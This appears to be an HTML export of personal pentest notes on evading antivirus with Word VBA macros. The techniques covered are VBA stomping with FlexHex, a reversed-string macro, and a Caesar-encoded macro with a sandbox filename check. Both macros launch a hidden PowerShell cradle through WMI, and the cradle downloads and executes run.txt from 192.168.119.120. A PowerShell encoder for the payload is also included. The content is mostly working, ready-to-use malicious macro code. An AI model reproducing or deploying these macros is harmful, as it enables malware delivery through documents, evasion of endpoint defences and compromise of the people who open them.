<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bypass AV in VBA</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bypass AV in VBA</h1><br/><p><ul><li><small>SAME by encrypting vba macro via ceasar algo but with decimal values </small></li></ul><small></small></p><p><small></small><ul><li><small>insert encrypted shell code and decrypted routine + time lapse will not help as signature based detection will catch them</small></li></ul><small></small></p><p><small></small></p><p></p><p><h2>Stomping on Microsoft word</h2><ul><li>• <small>• remove macro but sill make it execute </small></li><li><small>flexHex</small><ul><li><small>First, we’ll open FlexHEX and navigate to File &gt; Open &gt; OLE Compound File</small></li><li></li></ul></li></ul><img src="images/14-1.png" alt="images/14-1.png" /><ul><li></li></ul><img src="images/14-2.png" alt="images/14-2.png" /><ul><li></li></ul><img src="images/14-3.png" alt="images/14-3.png" /><ul><li>   ◇ <small>   ◇ remove this link in the editor, it could hide our macro from within the graphical Office VBA editor</small></li><li></li></ul><img src="images/14-4.png" alt="images/14-4.png" /></p><p></p><p></p><p><h2>Bypass with powershell embeded</h2><small></small></p><p><small></small><ul><li>issues: powershellas a child of office + obfuscate runner <ul><li>solution1: create new process</li><li>solution2 : obfuscation (e.g reverse string + reduce reverse usage ) / or ceasr cypher encrypt <ul><li><a href="https://codebeautify.org/reverse-string">https://codebeautify.org/reverse-strin</a>g</li></ul></li></ul></li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Function</span> bears(cows)<br />    bears = StrReverse(cows)<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span><br /><br /><span style="color:#ff9d00;font-weight:700">Sub</span> Mymacro()<br /><span style="color:#ff9d00;font-weight:700">Dim</span> strArg <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">String</span><br />strArg = bears(<span style="color:#3ad900;font-weight:400">&quot;))&#39;txt.nur/021.911.861.291//:ptth&#39;(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop&quot;</span>)<br /><br />GetObject(bears(<span style="color:#3ad900;font-weight:400">&quot;:stmgmniw&quot;</span>)).<span style="color:#ff9d00;font-weight:700">Get</span>(bears(<span style="color:#3ad900;font-weight:400">&quot;ssecorP_23niW&quot;</span>)).Create strArg, <span style="color:#ff0044;font-weight:700">Null</span>, <span style="color:#ff0044;font-weight:700">Null</span>, pid<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span></pre></div></p><p></p><p></p><p><h2>Ceasar VBA encrypted via calling run.txt</h2></p><p></p><p><ul><li>• <small>• bypass heuristic based detection</small><ul><li><small>most emulator will rename the file before scanning it </small></li><li><small>we can check if the name was unchanged </small></li></ul></li></ul><small></small></p><p><small></small><ul><li><small>Ps ecnyrptor</small></li><li><small>encrypt winmgmts: ; Win32_Process ; powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring(&#39;</small><a href="http://192.168.119.120/run.txt">http://192.168.119.120/run.txt</a></li><li>encryptor</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$payload</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring(&#39;http://192.168.119.120/run.txt&#39;))&quot;</span><br /><br />[<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#0088ff;font-weight:400">$output</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">$payload</span>.ToCharArray() | <span style="color:#ff9d00;font-weight:700">%</span>{<br />    [<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#0088ff;font-weight:400">$thischar</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">byte</span>][<span style="color:#7f0044;font-weight:400">char</span>]<span style="color:#0088ff;font-weight:400">$_</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">17</span><br />    <span style="color:#ff9d00;font-weight:700">if</span>(<span style="color:#0088ff;font-weight:400">$thischar</span>.Length <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#333333;font-weight:400">1</span>)<br />    {<br />        <span style="color:#0088ff;font-weight:400">$thischar</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#3ad900;font-weight:400">&quot;00&quot;</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#0088ff;font-weight:400">$thischar</span><br />        <span style="color:#0088ff;font-weight:400">$output</span> <span style="color:#ff9d00;font-weight:700">+=</span> <span style="color:#0088ff;font-weight:400">$thischar</span><br />    }<br />    <span style="color:#ff9d00;font-weight:700">elseif</span>(<span style="color:#0088ff;font-weight:400">$thischar</span>.Length <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#333333;font-weight:400">2</span>)<br />    {<br />        <span style="color:#0088ff;font-weight:400">$thischar</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#3ad900;font-weight:400">&quot;0&quot;</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#0088ff;font-weight:400">$thischar</span><br />        <span style="color:#0088ff;font-weight:400">$output</span> <span style="color:#ff9d00;font-weight:700">+=</span> <span style="color:#0088ff;font-weight:400">$thischar</span><br />    }<br />    <span style="color:#ff9d00;font-weight:700">elseif</span>(<span style="color:#0088ff;font-weight:400">$thischar</span>.Length <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#333333;font-weight:400">3</span>)<br />    {<br />        <span style="color:#0088ff;font-weight:400">$output</span> <span style="color:#ff9d00;font-weight:700">+=</span> <span style="color:#0088ff;font-weight:400">$thischar</span><br />    }<br />}<br /><span style="color:#0088ff;font-weight:400">$output</span> | clip</pre></div></p><p><ul><li>vba script (paylod to be changed)</p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Function</span> Pears(Beets)<br />    Pears = Chr(Beets - 17)<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span><br /><br /><span style="color:#ff9d00;font-weight:700">Function</span> Strawberries(Grapes)<br />    Strawberries = Left(Grapes, 3)<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span><br /><br /><span style="color:#ff9d00;font-weight:700">Function</span> Almonds(Jelly)<br />    Almonds = Right(Jelly, Len(Jelly) - 3)<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span><br /><br /><span style="color:#ff9d00;font-weight:700">Function</span> Nuts(Milk)<br />    <span style="color:#ff9d00;font-weight:700">Do</span><br />    Oatmilk = Oatmilk + Pears(Strawberries(Milk))<br />    Milk = Almonds(Milk)<br />    <span style="color:#ff9d00;font-weight:700">Loop</span> <span style="color:#ff9d00;font-weight:700">While</span> Len(Milk) &gt; 0<br />    Nuts = Oatmilk<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span><br /><br /><span style="color:#ff9d00;font-weight:700">Function</span> MyMacro()<br /><span style="color:#333333;font-weight:400">    If ActiveDocument.Name &lt;&gt; Nuts(&quot;131134127127118131063117128116&quot;) Then</span><br />        <span style="color:#ff9d00;font-weight:700">Exit</span> <span style="color:#ff9d00;font-weight:700">Function</span><br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br />    <span style="color:#ff9d00;font-weight:700">Dim</span> Apples <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">String</span><br />    <span style="color:#ff9d00;font-weight:700">Dim</span> Water <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">String</span><br />    <br />    Apples = <span style="color:#3ad900;font-weight:400">&quot;129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058&quot;</span><br />    Water = Nuts(Apples)<br />    GetObject(Nuts(<span style="color:#3ad900;font-weight:400">&quot;136122127126120126133132075&quot;</span>)).<span style="color:#ff9d00;font-weight:700">Get</span>(Nuts(<span style="color:#3ad900;font-weight:400">&quot;104122127068067112097131128116118132132&quot;</span>)).Create Water, Tea, Coffee, Napkin<br /><span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span></pre></div></p></div>
</body>
</html>
